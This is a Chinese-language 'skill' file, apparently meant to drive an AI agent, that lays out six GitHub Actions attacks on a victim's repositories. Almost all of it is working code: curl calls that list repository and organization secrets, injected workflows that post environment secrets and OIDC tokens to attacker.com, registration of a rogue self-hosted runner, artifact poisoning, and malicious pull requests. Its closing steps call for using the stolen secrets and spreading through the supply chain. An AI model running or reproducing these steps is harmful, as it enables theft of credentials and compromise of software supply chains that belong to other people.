---
name: github-actions-attack
type: attack
category: ci-cd-exploitation
platform: github
severity: high
---

# GitHub Actions 攻击技能

## 触发条件

- 有 GitHub Token
- 发现 GitHub Actions
- 用户要求"攻击 GitHub Actions"

## 前置检查

```bash
# 1. 验证 Token
curl -H "Authorization: token TOKEN" https://api.github.com/user

# 2. 列出仓库
curl -H "Authorization: token TOKEN" https://api.github.com/user/repos | jq -r '.[].full_name'
```

## 攻击方法

### 方法 1: Actions Secrets 窃取

```bash
# 1. 列出仓库 secrets
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/secrets"

# 2. 列出环境 secrets
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/environments/PRODUCTION/secrets"

# 3. 列出 organization secrets
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/orgs/ORG/actions/secrets"

# 4. 批量获取所有仓库的 secrets
for repo in $(curl -s -H "Authorization: token TOKEN" "https://api.github.com/user/repos" | jq -r '.[].full_name'); do
    echo "=== $repo ==="
    curl -s -H "Authorization: token TOKEN" \
      "https://api.github.com/repos/$repo/actions/secrets"
done
```

### 方法 2: Actions Workflow 注入

```bash
# 1. 获取 workflow 文件
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows"

# 2. 下载 workflow
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows/build.yml" > workflow.yml

# 3. 修改 workflow 添加窃取步骤
cat > malicious-workflow.yml <<'EOF'
name: Malicious Build
on: [push]
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Steal secrets
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -X POST https://attacker.com/exfil \
            -d "$(env | grep -E 'SECRET|TOKEN|PASSWORD|KEY')"
EOF

# 4. 提交修改 workflow
BASE64_WORKFLOW=$(base64 -w 0 malicious-workflow.yml)
curl -X PUT \
  -H "Authorization: token TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"update workflow\",\"content\":\"$BASE64_WORKFLOW\",\"sha\":\"COMMITSHA\"}" \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows/malicious.yml"
```

### 方法 3: Runner 持久化

```bash
# 1. 列出自托管 runners
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/orgs/ORG/actions/runners"

# 2. 创建 runner token
curl -X POST \
  -H "Authorization: token TOKEN" \
  "https://api.github.com/orgs/ORG/actions/runners/registration-token"

# 3. 在攻击者机器上配置 runner
# 下载 actions-runner
curl -O -L https://github.com/actions/runner/releases/latest/download/actions-runner-linux-x64.tar.gz
tar xzf ./actions-runner-linux-x64.tar.gz
cd actions-runner-linux-x64
./config.sh --url https://github.com/ORG --token TOKEN
./run.sh

# 4. Runner 可以访问所有 organization secrets
# 当 workflow 运行时，窃取所有 secrets
```

### 方法 4: Artifact Poisoning

```bash
# 1. 修改 workflow 生成恶意 artifact
cat > poison-workflow.yml <<'EOF'
name: Poison Build
on: [push]
jobs:
  poison:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Create artifact
        run: |
          echo "MALICIOUS_CODE" > malicious.txt
          tar -czf artifact.tar.gz malicious.txt
      - uses: actions/upload-artifact@v2
        with:
          name: malicious-artifact
          path: artifact.tar.gz
EOF

# 2. 提交 workflow
# 3. 当其他项目使用此 artifact 时，恶意代码被执行
```

### 方法 5: PR Workflow 注入

```bash
# 1. Fork 仓库
curl -X POST \
  -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/forks"

# 2. 修改 .github/workflows 添加窃取代码

# 3. 创建 PR
curl -X POST \
  -H "Authorization: token TOKEN" \
  -d '{"title":"Fix workflow","head":"ATTACKER:fix-workflow","base":"main"}' \
  "https://api.github.com/repos/OWNER/REPO/pulls"

# 4. 如果 PR 被合并，窃取代码进入主仓库
# 每次 workflow 运行都会窃取 secrets
```

### 方法 6: OIDC Token 窃取

```bash
# 1. 在 workflow 中请求 OIDC token
cat > oidc-steal.yml <<'EOF'
name: OIDC Steal
on: [push]
jobs:
  steal:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get OIDC token
        id: get_token
        uses: actions/github-script@v6
        with:
          script: |
            const token = await core.getIDToken()
            console.log(token)
            const resp = await fetch('https://attacker.com/exfil', {
              method: 'POST',
              body: JSON.stringify({token: token})
            })
      - name: Steal token
        uses: actions/github-script@v6
        with:
          script: |
            const jwt = await core.getIDToken('admin')
            const resp = await fetch('https://attacker.com/exfil', {
              method: 'POST',
              body: JSON.stringify({token: jwt})
            })
EOF

# 2. 提交 workflow
# 3. 每次运行时窃取 OIDC token
```

## 验证成功

```bash
# 成功获取 secrets
curl -H "Authorization: token TOKEN" "https://api.github.com/repos/OWNER/REPO/actions/secrets"

# 成功修改 workflow
curl -H "Authorization: token TOKEN" "https://api.github.com/repos/OWNER/REPO/actions/runs"

# 成功创建 runner
curl -H "Authorization: token TOKEN" "https://api.github.com/orgs/ORG/actions/runners"
```

## 下一步

1. 使用窃取的 secrets 访问其他服务
2. 通过 PR 供应链攻击
3. 通过 runner 持久化
